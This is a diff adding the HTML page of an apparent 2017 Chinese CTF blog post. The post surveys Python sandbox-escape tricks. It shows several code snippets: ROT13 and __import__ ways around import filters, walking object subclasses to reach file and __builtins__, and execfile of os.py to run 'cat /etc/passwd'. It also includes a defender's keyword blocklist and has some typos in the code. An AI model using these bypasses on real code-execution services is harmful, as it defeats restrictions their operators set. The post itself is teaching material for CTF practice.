@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="0x00 前言Python真的存在所谓的沙箱吗？emmm…答案是不存在的。 在此总结一下ctf中出现的一些 “沙箱” 逃逸姿势。 0x01 Sandbox逃逸概述所谓sandbox-escape就是在给的代码执行环境下（比如Online-Judge、在线代码运行器以及socat生成的交互式终端等），逃脱限制达到执行任意代码拿到shell的过程。 总的来看，一般有以下方法。  使用os包中的pope">
+<meta name="keywords" content="Pyhton,sandbox,沙箱逃逸">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Python 沙箱逃逸的一些姿势">
+<meta property="og:url" content="http://yoursite.com/2017/10/13/Python-Sandbox-Escape/index.html">
+<meta property="og:site_name" content="Windy&#39;s blog">
+<meta property="og:description" content="0x00 前言Python真的存在所谓的沙箱吗？emmm…答案是不存在的。 在此总结一下ctf中出现的一些 “沙箱” 逃逸姿势。 0x01 Sandbox逃逸概述所谓sandbox-escape就是在给的代码执行环境下（比如Online-Judge、在线代码运行器以及socat生成的交互式终端等），逃脱限制达到执行任意代码拿到shell的过程。 总的来看，一般有以下方法。  使用os包中的pope">
+<meta property="og:updated_time" content="2017-10-14T15:19:01.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Python 沙箱逃逸的一些姿势">
+<meta name="twitter:description" content="0x00 前言Python真的存在所谓的沙箱吗？emmm…答案是不存在的。 在此总结一下ctf中出现的一些 “沙箱” 逃逸姿势。 0x01 Sandbox逃逸概述所谓sandbox-escape就是在给的代码执行环境下（比如Online-Judge、在线代码运行器以及socat生成的交互式终端等），逃脱限制达到执行任意代码拿到shell的过程。 总的来看，一般有以下方法。  使用os包中的pope">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Python 沙箱逃逸的一些姿势</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Windy&#39;s blog" type="application/atom+xml" />
+    
+</head>
+
+<body>
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2017/10/05/Base64-Expand-Char-GetShell/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2017/10/13/Python-Sandbox-Escape/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2017/10/13/Python-Sandbox-Escape/&text=Python 沙箱逃逸的一些姿势"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2017/10/13/Python-Sandbox-Escape/&title=Python 沙箱逃逸的一些姿势"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2017/10/13/Python-Sandbox-Escape/&is_video=false&description=Python 沙箱逃逸的一些姿势"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Python 沙箱逃逸的一些姿势&body=Check out this article: http://yoursite.com/2017/10/13/Python-Sandbox-Escape/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2017/10/13/Python-Sandbox-Escape/&title=Python 沙箱逃逸的一些姿势"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2017/10/13/Python-Sandbox-Escape/&title=Python 沙箱逃逸的一些姿势"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2017/10/13/Python-Sandbox-Escape/&title=Python 沙箱逃逸的一些姿势"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2017/10/13/Python-Sandbox-Escape/&title=Python 沙箱逃逸的一些姿势"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2017/10/13/Python-Sandbox-Escape/&name=Python 沙箱逃逸的一些姿势&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Sandbox逃逸概述"><span class="toc-number">2.</span> <span class="toc-text">0x01 Sandbox逃逸概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Escape姿势"><span class="toc-number">3.</span> <span class="toc-text">0x02 Escape姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过过滤import入包"><span class="toc-number">3.1.</span> <span class="toc-text">绕过过滤import入包</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#一、修改import关键字"><span class="toc-number">3.1.1.</span> <span class="toc-text">一、修改import关键字</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#二、-import-函数"><span class="toc-number">3.1.2.</span> <span class="toc-text">二、_import_ 函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#三、importlib库"><span class="toc-number">3.1.3.</span> <span class="toc-text">三、importlib库</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过删除os模块"><span class="toc-number">3.2.</span> <span class="toc-text">绕过删除os模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过删除-builtins"><span class="toc-number">3.3.</span> <span class="toc-text">绕过删除 _builtins_</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Reload"><span class="toc-number">3.3.1.</span> <span class="toc-text">Reload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#class属性"><span class="toc-number">3.3.2.</span> <span class="toc-text">class属性</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#execfile"><span class="toc-number">3.4.</span> <span class="toc-text">execfile</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dir-和-dict"><span class="toc-number">3.5.</span> <span class="toc-text">dir 和 _dict_</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index width mx-auto px2 my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Python 沙箱逃逸的一些姿势
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Windy's blog</span>
+      </span>
+      
+    <div class="postdate">
+        <i class="fa fa-calendar-o"></i>
+        <time datetime="2017-10-13T05:52:47.000Z" itemprop="datePublished">2017-10-13</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <span id="/2017/10/13/Python-Sandbox-Escape/" class="leancloud_visitors" data-flag-title="Python 沙箱逃逸的一些姿势">                    
+            <span class="post-meta-item-icon">
+            <i class="fa fa-eye"></i>
+            </span>
+            
+            <span class="post-meta-item-text">阅读次数</span>
+            <span class="leancloud-visitors-count"></span>
+        </span>
+    </div>
+
+      
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/Pyhton/">Pyhton</a>, <a class="tag-link" href="/tags/sandbox/">sandbox</a>, <a class="tag-link" href="/tags/沙箱逃逸/">沙箱逃逸</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Python真的存在所谓的沙箱吗？emmm…答案是不存在的。</p>
+<p>在此总结一下ctf中出现的一些 <em>“沙箱”</em> 逃逸姿势。</p>
+<h2 id="0x01-Sandbox逃逸概述"><a href="#0x01-Sandbox逃逸概述" class="headerlink" title="0x01 Sandbox逃逸概述"></a>0x01 Sandbox逃逸概述</h2><p>所谓sandbox-escape就是在给的代码执行环境下（比如Online-Judge、在线代码运行器以及socat生成的交互式终端等），逃脱限制达到执行任意代码拿到shell的过程。</p>
+<p>总的来看，一般有以下方法。</p>
+<ol>
+<li>使用os包中的popen,system两个函数来直接执行shell</li>
+<li>使用subprocess包中的call方法来执行函数</li>
+<li>使用commands模块中的方法</li>
+<li>文件操作execfile</li>
+<li>eval动态执行后面的代码</li>
+<li>利用内存破坏漏洞来实现Python沙盒逃逸</li>
+<li>越过真正的Python虚拟机执行shellcode</li>
+<li></li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> subpress</div><div class="line"><span class="keyword">import</span> commands</div><div class="line"></div><div class="line">os.system(<span class="string">"ifconfig"</span>)</div><div class="line">os.popen(<span class="string">"ifconfig"</span>)</div><div class="line">commands.getoutput(<span class="string">"ifconfig"</span>)</div><div class="line">commands.getstatusoutput(<span class="string">"ifconfig"</span>)</div><div class="line">subprodess.call(<span class="string">"ifconfig"</span>)</div></pre></td></tr></table></figure>
+<h2 id="0x02-Escape姿势"><a href="#0x02-Escape姿势" class="headerlink" title="0x02 Escape姿势"></a>0x02 Escape姿势</h2><p>设置沙箱的防御者，肯定会加上各种过滤来防御逃逸，最常见的方法就是来禁用敏感函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> re</div><div class="line">code = open(<span class="string">'code.py'</span>).read()</div><div class="line">pattern  = re.compile(<span class="string">'import\s+(os|commands|subprocess|sys)'</span>)</div><div class="line">match = re.search(pattern,code)</div><div class="line"><span class="keyword">if</span> match:</div><div class="line">    <span class="keyword">print</span> <span class="string">"forbidden module import detected"</span></div><div class="line">    <span class="keyword">raise</span> Exception</div></pre></td></tr></table></figure>
+<p>绕过姿势</p>
+<h3 id="绕过过滤import入包"><a href="#绕过过滤import入包" class="headerlink" title="绕过过滤import入包"></a>绕过过滤import入包</h3><h4 id="一、修改import关键字"><a href="#一、修改import关键字" class="headerlink" title="一、修改import关键字"></a>一、修改import关键字</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># coding: rot_13</div><div class="line"># &quot;import evil_module&quot; encoded in ROT13</div><div class="line">&apos;vzcbeg rivy_zbqhyr&apos;</div></pre></td></tr></table></figure>
+<p>在脚本之前加入前两行，python解释器就会使整个脚本都经过编码。</p>
+<h4 id="二、-import-函数"><a href="#二、-import-函数" class="headerlink" title="二、_import_ 函数"></a>二、<code>_import_</code> 函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">comd = __import__(<span class="string">"pbzznaqf"</span>.decode(<span class="string">'rot_13'</span>))</div><div class="line"><span class="keyword">print</span> comd.getoutput(<span class="string">'ifconfig'</span>)</div></pre></td></tr></table></figure>
+<h4 id="三、importlib库"><a href="#三、importlib库" class="headerlink" title="三、importlib库"></a>三、importlib库</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> importlib</div><div class="line">comd = importlib.import_module(<span class="string">"pbzznaqf"</span>.decode(<span class="string">'rot_13'</span>)</div><div class="line"><span class="keyword">print</span> comd.getoutput(<span class="string">'ifconfig'</span>)</div></pre></td></tr></table></figure>
+<h3 id="绕过删除os模块"><a href="#绕过删除os模块" class="headerlink" title="绕过删除os模块"></a>绕过删除os模块</h3><p>如果os从sys.modules中删除，就不能再引入了。</p>
+<p>我们可以通过 <em>sys</em> 模块引入。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">'os'</span>]=<span class="string">'/usr/lib/python2.7/os.py'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</div></pre></td></tr></table></figure>
+<h3 id="绕过删除-builtins"><a href="#绕过删除-builtins" class="headerlink" title="绕过删除 _builtins_"></a>绕过删除 <code>_builtins_</code></h3><h4 id="Reload"><a href="#Reload" class="headerlink" title="Reload"></a>Reload</h4><p><code>reload(__builtin__)</code><br>但是reload也是<code>__builtin__</code>中的函数，如果被删除一样没有什么办法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">In [8]: del __builtin__.reload</div><div class="line"></div><div class="line">In [9]: reload</div><div class="line">---------------------------------------------------------------------------</div><div class="line">NameError                                 Traceback (most recent call last)</div><div class="line">&lt;ipython-input-9-5da994700066&gt; in &lt;module&gt;()</div><div class="line">----&gt; 1 reload</div><div class="line"></div><div class="line">NameError: name &apos;reload&apos; is not defined</div></pre></td></tr></table></figure>
+<p>or</p>
+<p>使用imp模块，其中有reload方法来重新载入<code>_builtins_</code></p>
+<h4 id="class属性"><a href="#class属性" class="headerlink" title="class属性"></a>class属性</h4><p><code>dic</code> and <code>_dict_</code></p>
+<p>首先python的内置对象有一个class属性来存储类型，我们往上找他的父类使用base属性</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; &#123;&#125;.__class__.__base__</div><div class="line">&lt;type &apos;object&apos;&gt;</div><div class="line">&gt;&gt;&gt; ().__class__.__base__</div><div class="line">&lt;type &apos;object&apos;&gt;</div><div class="line">&gt;&gt;&gt; [].__class__.__base__</div><div class="line">&lt;type &apos;object&apos;&gt;</div></pre></td></tr></table></figure>
+<p>可以看到返回object对象，因为python中一切均为对象，均继承object对象，得到object之后我们就可在通过属性subclasses来查看object的子类（包括所有的内置类）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()</div><div class="line">[&lt;type &apos;type&apos;&gt;, &lt;type &apos;weakref&apos;&gt;, &lt;type &apos;weakcallableproxy&apos;&gt;, &lt;type &apos;weakproxy&apos;&gt;, &lt;type &apos;int&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;bytearray&apos;&gt;, &lt;type &apos;list&apos;&gt;, &lt;type &apos;NoneType&apos;&gt;, &lt;type &apos;NotImplementedType&apos;&gt;, &lt;type &apos;traceback&apos;&gt;, &lt;type &apos;super&apos;&gt;, &lt;type &apos;xrange&apos;&gt;, &lt;type &apos;dict&apos;&gt;, &lt;type &apos;set&apos;&gt;, &lt;type &apos;slice&apos;&gt;, &lt;type &apos;staticmethod&apos;&gt;, &lt;type &apos;complex&apos;&gt;, &lt;type &apos;float&apos;&gt;, &lt;type &apos;buffer&apos;&gt;, &lt;type &apos;long&apos;&gt;, &lt;type &apos;frozenset&apos;&gt;, &lt;type &apos;property&apos;&gt;, &lt;type &apos;memoryview&apos;&gt;, &lt;type &apos;tuple&apos;&gt;, &lt;type &apos;enumerate&apos;&gt;, &lt;type &apos;reversed&apos;&gt;, &lt;type &apos;code&apos;&gt;, &lt;type &apos;frame&apos;&gt;, &lt;type &apos;builtin_function_or_method&apos;&gt;, &lt;type &apos;instancemethod&apos;&gt;, &lt;type &apos;function&apos;&gt;, &lt;type &apos;classobj&apos;&gt;, &lt;type &apos;dictproxy&apos;&gt;, &lt;type &apos;generator&apos;&gt;, &lt;type &apos;getset_descriptor&apos;&gt;, &lt;type &apos;wrapper_descriptor&apos;&gt;, &lt;type &apos;instance&apos;&gt;, &lt;type &apos;ellipsis&apos;&gt;, &lt;type &apos;member_descriptor&apos;&gt;, &lt;type &apos;file&apos;&gt;, &lt;type &apos;PyCapsule&apos;&gt;, &lt;type &apos;cell&apos;&gt;, &lt;type &apos;callable-iterator&apos;&gt;, &lt;type &apos;iterator&apos;&gt;, &lt;type &apos;sys.long_info&apos;&gt;, &lt;type &apos;sys.float_info&apos;&gt;, &lt;type &apos;EncodingMap&apos;&gt;, &lt;type &apos;fieldnameiterator&apos;&gt;, &lt;type &apos;formatteriterator&apos;&gt;, &lt;type &apos;sys.version_info&apos;&gt;, &lt;type &apos;sys.flags&apos;&gt;, &lt;type &apos;exceptions.BaseException&apos;&gt;, &lt;type &apos;module&apos;&gt;, &lt;type &apos;imp.NullImporter&apos;&gt;, &lt;type &apos;zipimport.zipimporter&apos;&gt;, &lt;type &apos;posix.stat_result&apos;&gt;, &lt;type &apos;posix.statvfs_result&apos;&gt;, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &lt;class &apos;_weakrefset._IterationGuard&apos;&gt;, &lt;class &apos;_weakrefset.WeakSet&apos;&gt;, &lt;class &apos;_abcoll.Hashable&apos;&gt;, &lt;type &apos;classmethod&apos;&gt;, &lt;class &apos;_abcoll.Iterable&apos;&gt;, &lt;class &apos;_abcoll.Sized&apos;&gt;, &lt;class &apos;_abcoll.Container&apos;&gt;, &lt;class &apos;_abcoll.Callable&apos;&gt;, &lt;type &apos;dict_keys&apos;&gt;, &lt;type &apos;dict_items&apos;&gt;, &lt;type &apos;dict_values&apos;&gt;, &lt;class &apos;site._Printer&apos;&gt;, &lt;class &apos;site._Helper&apos;&gt;, &lt;type &apos;_sre.SRE_Pattern&apos;&gt;, &lt;type &apos;_sre.SRE_Match&apos;&gt;, &lt;type &apos;_sre.SRE_Scanner&apos;&gt;, &lt;class &apos;site.Quitter&apos;&gt;, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;]</div></pre></td></tr></table></figure>
+<p>然后查找子类位置，比如file</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__().index(file)</div><div class="line">40</div></pre></td></tr></table></figure>
+<p>通过file类的别名来读文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; f=[].__class__.__base__.__subclasses__()[40]</div><div class="line">&gt;&gt;&gt; f(&apos;./flag.txt&apos;).read()</div></pre></td></tr></table></figure>
+<p>或者引入<code>__builtins__</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">classes = &#123;&#125;.__class__.__base__.__subclasses__()</div><div class="line">b = classes[<span class="number">49</span>]()._module.__builtins__</div><div class="line">m = b[<span class="string">'__import__'</span>](<span class="string">'os'</span>)</div><div class="line">m.system(<span class="string">"whomai"</span>)</div></pre></td></tr></table></figure>
+<h3 id="execfile"><a href="#execfile" class="headerlink" title="execfile"></a>execfile</h3><p>如果sys也被删除了，可以通过execfile，加载文件。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>execfile(<span class="string">'/usr/lib/python2.7/os.py'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>system(<span class="string">'cat /etc/passwd'</span>)</div><div class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/bin/bash</div><div class="line">daemon:x:<span class="number">1</span>:<span class="number">1</span>:daemon:/usr/sbin:/usr/sbin/nologin</div><div class="line">bin:x:<span class="number">2</span>:<span class="number">2</span>:bin:/bin:/usr/sbin/nologin</div><div class="line">sys:x:<span class="number">3</span>:<span class="number">3</span>:sys:/dev:/usr/sbin/nologin</div><div class="line">...</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>getcwd()</div><div class="line"><span class="string">'/usr/lib/python2.7'</span></div></pre></td></tr></table></figure>
+<p>当然也可以进行一些编码的操作，绕过关键词的检查。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line">execfile(&apos;/hfe/yvo/clguba2.7/fhocebprff.cl&apos;.decode(&apos;rot13&apos;))</div><div class="line">call(&quot;cat /codes/f1ag_34t6refg812rewfuy&quot;, shell=True)</div></pre></td></tr></table></figure>
+<h3 id="dir-和-dict"><a href="#dir-和-dict" class="headerlink" title="dir 和 _dict_"></a>dir 和 <code>_dict_</code></h3><p>列出一个模组/类/对象 下面 所有的属性和函数</p>
+
+  </div>
+</article>
+
+      <div id="SOHUCS"></div>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Sandbox逃逸概述"><span class="toc-number">2.</span> <span class="toc-text">0x01 Sandbox逃逸概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Escape姿势"><span class="toc-number">3.</span> <span class="toc-text">0x02 Escape姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过过滤import入包"><span class="toc-number">3.1.</span> <span class="toc-text">绕过过滤import入包</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#一、修改import关键字"><span class="toc-number">3.1.1.</span> <span class="toc-text">一、修改import关键字</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#二、-import-函数"><span class="toc-number">3.1.2.</span> <span class="toc-text">二、_import_ 函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#三、importlib库"><span class="toc-number">3.1.3.</span> <span class="toc-text">三、importlib库</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过删除os模块"><span class="toc-number">3.2.</span> <span class="toc-text">绕过删除os模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过删除-builtins"><span class="toc-number">3.3.</span> <span class="toc-text">绕过删除 _builtins_</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Reload"><span class="toc-number">3.3.1.</span> <span class="toc-text">Reload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#class属性"><span class="toc-number">3.3.2.</span> <span class="toc-text">class属性</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#execfile"><span class="toc-number">3.4.</span> <span class="toc-text">execfile</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dir-和-dict"><span class="toc-number">3.5.</span> <span class="toc-text">dir 和 _dict_</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2017/10/13/Python-Sandbox-Escape/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2017/10/13/Python-Sandbox-Escape/&text=Python 沙箱逃逸的一些姿势"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2017/10/13/Python-Sandbox-Escape/&title=Python 沙箱逃逸的一些姿势"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2017/10/13/Python-Sandbox-Escape/&is_video=false&description=Python 沙箱逃逸的一些姿势"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Python 沙箱逃逸的一些姿势&body=Check out this article: http://yoursite.com/2017/10/13/Python-Sandbox-Escape/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2017/10/13/Python-Sandbox-Escape/&title=Python 沙箱逃逸的一些姿势"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2017/10/13/Python-Sandbox-Escape/&title=Python 沙箱逃逸的一些姿势"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2017/10/13/Python-Sandbox-Escape/&title=Python 沙箱逃逸的一些姿势"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2017/10/13/Python-Sandbox-Escape/&title=Python 沙箱逃逸的一些姿势"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2017/10/13/Python-Sandbox-Escape/&name=Python 沙箱逃逸的一些姿势&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2015 - 2017 Jack Yang
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
